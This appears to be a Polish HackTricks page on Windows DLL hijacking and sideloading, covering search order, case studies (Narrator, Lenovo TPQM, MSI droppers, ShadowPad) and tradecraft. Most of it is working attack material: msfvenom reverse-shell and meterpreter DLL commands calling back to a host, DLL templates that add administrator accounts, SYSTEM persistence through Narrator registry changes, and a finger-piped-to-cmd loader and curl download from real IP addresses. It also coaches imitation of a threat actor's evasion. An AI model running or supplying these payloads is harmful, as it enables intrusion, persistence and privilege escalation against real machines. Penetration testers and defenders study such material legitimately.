# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmuszeniu zaufanej aplikacji do załadowania złośliwej DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest to głównie wykorzystywane do uruchamiania kodu, osiągania persistence oraz, rzadziej, eskalacji uprawnień. Pomimo, że tutaj skupiamy się na eskalacji, metoda hijackingu jest taka sama niezależnie od celu.

### Najczęstsze techniki

Kilka metod jest stosowanych do DLL hijackingu, każda z różną skutecznością zależnie od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Zamiana oryginalnej DLL na złośliwą, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnej DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed prawidłową, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Stworzenie złośliwej DLL, którą aplikacja załaduje, myśląc, że to nieistniejąca wymagana DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby nakierować aplikację na złośliwą DLL.
5. **WinSxS DLL Replacement**: Podmiana legalnej DLL na złośliwą w katalogu WinSxS — metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika razem z skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Aby zobaczyć krok po kroku łańcuch łączący HTML staging, konfiguracje AES-CTR i .NET implanty nakładane na DLL sideloading, przejrzyj workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących Dlls

Najczęstszym sposobem na znalezienie brakujących Dlls w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i ustawienie następujących 2 filtrów:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

oraz wyświetlanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dlls ogólnie**, pozostaw to uruchomione na kilka **sekund**.\
Jeśli szukasz **brakującej dll w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, np. "Process Name" "contains" `<exec name>`, uruchom go i zatrzymaj przechwytywanie zdarzeń.

## Wykorzystywanie brakujących Dlls

Aby eskalować uprawnienia, najlepszą szansą jest możliwość zapisania DLL, którą proces działający z wyższymi uprawnieniami spróbuje załadować w jednym z miejsc, gdzie będzie ona wyszukiwana. W praktyce oznacza to, że możemy zapisać DLL w folderze, który jest przeszukiwany przed folderem zawierającym oryginalną DLL (rzadszy przypadek), albo zapisać ją w folderze, w którym DLL będzie szukana, jeśli oryginalna DLL nie istnieje w żadnym z folderów.

### Dll Search Order

**W** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz szczegółowe informacje o tym, jak Dll są ładowane.**

Aplikacje Windows wyszukują DLL, podążając za zestawem predefiniowanych ścieżek wyszukiwania, w określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwa DLL zostanie umieszczona w jednej z tych lokalizacji tak, że zostanie załadowana przed autentyczną DLL. Rozwiązaniem jest upewnienie się, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLL.

Poniżej widzisz kolejność wyszukiwania DLL na systemach 32-bitowych:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu. (_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie istnieje funkcja, która zwraca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zauważ, że nie obejmuje to ścieżki przypisanej per-aplikacja określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

To jest domyślna kolejność wyszukiwania przy włączonym SafeDllSearchMode. Jeśli jest wyłączony, bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączone).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zauważ że DLL może być ładowana wskazując ścieżkę absolutną zamiast samej nazwy. W takim przypadku ta DLL będzie wyszukiwana tylko w tej ścieżce (jeśli ta DLL ma zależności, będą one wyszukiwane jak zwykłe załadowane po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, których tu nie opisuję.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób na deterministyczne wpłynięcie na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu przy użyciu natywnych API ntdll. Dostarczając tu katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez ścieżki absolutnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwej DLL z tego katalogu.

Kluczowy pomysł
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na folder kontrolowany przez Ciebie (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny rozwiąże DLL po nazwie, loader skonsultuje dostarczony DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet gdy złośliwa DLL nie jest współlokowana z docelowym EXE.

Uwagi/ograniczenia
- Dotyczy tworzonego procesu potomnego; różni się od SetDllDirectory, który dotyczy tylko bieżącego procesu.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i twardo zakodowane ścieżki absolutne nie mogą być zhakowane. Forwarded exports i SxS mogą zmienić priorytety.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia w praktyce operacyjnej
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub działający jako proxy do prawdziwego) w katalogu DllPath.
- Uruchom podpisany binary znany z wyszukiwania xmllite.dll po nazwie przy użyciu powyższej techniki. Loader rozwiązuje import za pomocą podanego DllPath i sideloadsuje Twój DLL.

Technikę tę odnotowano w rzeczywistych atakach, prowadzącą do łańcuchów wielostopniowego sideloadingu: początkowy launcher upuszcza helper DLL, który następnie uruchamia Microsoft-signed, hijackable binary z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu stagingowego.


#### Exceptions on dll search order from Windows docs

W dokumentacji Windows odnotowano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkano **DLL o tej samej nazwie co już załadowany w pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego przeprowadza kontrolę redirection i manifestu przed domyślnym użyciem DLL już załadowanego w pamięci. **W tym scenariuszu system nie wykonuje wyszukiwania DLL**.
- W przypadkach, gdy DLL jest rozpoznawany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL, wraz z jej zależnymi DLL, **rezygnując z procesu wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL odbywa się tak, jakby były wskazane jedynie przez swoje **module names**, niezależnie od tego, czy początkowy DLL był identyfikowany przez pełną ścieżkę.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch poziomy lub lateralny), który **brakuje DLL**.
- Upewnij się, że masz **uprawnienie do zapisu** w dowolnym **katalogu**, w którym **będzie wyszukiwany DLL**. Lokalizacja ta może być katalogiem wykonywalnego lub katalogiem w system path.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie dość trudno znaleźć uprzywilejowany executable pozbawiony dll** i jeszcze **trudniej mieć prawa zapisu w katalogu system path** (domyślnie nie możesz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeżeli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz znaleźć tam **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz prawa zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze** wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich katalogów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** mając uprawnienia do zapisu w **System Path folder**, sprawdź:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia zapisu w którymkolwiek folderze znajdującym się w system PATH.\
Inne interesujące zautomatyzowane narzędzia do wykrywania tej luki to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeżeli znajdziesz scenariusz podatny na atak, jedną z najważniejszych rzeczy potrzebnych do jego pomyślnego wykorzystania będzie **utworzenie dll, który eksportuje przynajmniej wszystkie funkcje, które program będzie z niego importować**. Zwróć uwagę, że Dll Hijacking jest przydatny do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć poprawny dll** w tym studium dotyczącym dll hijacking ukierunkowanym na uruchamianie: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Co więcej, w **następnej sekcji** możesz znaleźć kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll eksportującego funkcje niewymagane**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

W zasadzie **Dll proxy** to Dll zdolny do **wywołania twojego złośliwego kodu po załadowaniu**, a także do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Zauważ, że w kilku przypadkach Dll, który kompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary. Jeśli te funkcje nie istnieją, **binary nie będzie w stanie ich załadować** i **exploit nie powiedzie się**.

<details>
<summary>Szablon DLL w C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład C++ DLL tworzący użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna C DLL z thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalny, specyficzny dla języka localization DLL przy starcie, który można hijackować w celu arbitrary code execution i persistence.

Kluczowe fakty
- Ścieżka sprawdzania (w obecnych wersjach): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ścieżka legacy (w starszych wersjach): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli pod ścieżką OneCore istnieje zapisywalny, kontrolowany przez atakującego plik DLL, zostanie on załadowany i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Żadne eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naiwny hijack spowoduje, że Narrator przemówi/podświetli UI. Aby zachować ciszę, po attachu wyenumeruj wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` go; kontynuuj we własnym wątku. Zobacz PoC po pełny kod.

Trigger and persistence via Accessibility configuration
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Dzięki powyższemu, uruchomienie Narrator ładuje podłożony DLL. Na bezpiecznym pulpicie (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na bezpiecznym pulpicie.

RDP-triggered SYSTEM execution (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP do hosta, na ekranie logowania naciśnij CTRL+WIN+ENTER aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru Accessibility Tool (AT) (np. CursorIndicator), edytować go, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na tę nazwę AT. To pośredniczy w uruchamianiu dowolnego kodu w ramach Accessibility.

Notes
- Zapisywanie w `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień administratora.
- Cała logika payload może znajdować się w `DLL_PROCESS_ATTACH`; żadne eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w TrackPoint Quick Menu firmy Lenovo (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` zlokalizowany w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Directory Permissions**: Zapisywalny przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom na umieszczanie dowolnych plików.
- **DLL Search Behavior**: Próbuje załadować `hostfxr.dll` z katalogu roboczego najpierw i loguje "NAME NOT FOUND" jeśli brak, co wskazuje na uprzywilejowanie wyszukiwania w lokalnym katalogu.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik umieść plik `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zadanie zaplanowane uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonania zadania, złośliwy DLL uruchomi się w sesji administratora na poziomie medium integrity.
4. Połącz standardowe techniki bypass UAC, aby podnieść uprawnienia z medium integrity do SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors często łączą MSI-based droppers z DLL side-loading, aby wykonać payloady pod zaufanym, podpisanym procesem.

Chain overview
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: Avast-signed `wsc_proxy.exe` + attacker-controlled `wsc.dll`).
- Po uruchomieniu podpisanego EXE, Windows DLL search order ładuje `wsc.dll` z katalogu roboczego jako pierwszy, wykonując kod atakującego pod podpisanym procesem rodzicem (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających executables lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence oraz Binary.
- Osadzone/podzielone payloady w CAB MSI:
- Extract administracyjny: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading with wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany cyfrowo host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: attacker DLL. Jeśli nie są wymagane żadne specyficzne exports, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane exports do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który również wykonuje twój payload.

- Ta technika polega na rozwiązywaniu nazw DLL przez plik wykonywalny hosta. Jeśli host używa ścieżek absolutnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS oraz forwarded exports mogą wpływać na priorytety i należy je uwzględnić przy wyborze pliku wykonywalnego hosta i zestawu eksportów.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point opisał, jak Ink Dragon wdraża ShadowPad używając **triady trzech plików**, aby wtopić się w legalne oprogramowanie, jednocześnie przechowując główny payload zaszyfrowany na dysku:

1. **Signed host EXE** – dostawcy tacy jak AMD, Realtek czy NVIDIA są nadużywani (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby wyglądał jak binarka Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – upuszczana obok EXE z oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binarką MFC obfuskowaną przy użyciu frameworka ScatterBrain; jej jedynym zadaniem jest znalezienie zaszyfrowanego bloba, odszyfrowanie go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po zmapowaniu odszyfrowanego payloadu do pamięci loader usuwa plik TMP, aby zniszczyć dowody śledcze.

Tradecraft notes:

* Zmienianie nazwy podpisanego EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu udawać binarkę Windows, jednocześnie zachowując podpis dostawcy, więc naśladuj zwyczaj Ink Dragon polegający na upuszczaniu binarek wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, większość mechanizmów allowlisting wymaga tylko, by złośliwy DLL znajdował się obok niego. Skoncentruj się na dostosowaniu loader DLL; podpisany rodzic zwykle może pozostać niezmieniony.
* ShadowPad’s decryptor oczekuje, że blob TMP będzie obok loadera i będzie zapisywalny, aby mógł wyzerować plik po zmapowaniu. Zachowaj katalog zapisywalny aż do załadowania payloadu; gdy payload będzie w pamięci, plik TMP można bezpiecznie usunąć ze względów OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwy DLL obok zaufanego EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom rotować serwer drugiego etapu po stronie serwera.

- **Built-in download/extract:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i przygotuj cel sideload oraz DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, tak aby telemetria pokazywała proces utworzony przez CIM, podczas gdy ładuje się współlokowany DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binarkami, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Włącz alert na `forfiles`, gdy `/p`, `/m` i `/c` występują razem; rzadkie poza skryptami administratorskimi.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawne włamanie Lotus Blossom nadużyło zaufanego łańcucha aktualizacji, aby dostarczyć dropper zapakowany w NSIS, który przygotowywał DLL sideload oraz w pełni pamięciowe payloady.

Przebieg operacji
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go **HIDDEN**, upuszcza przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
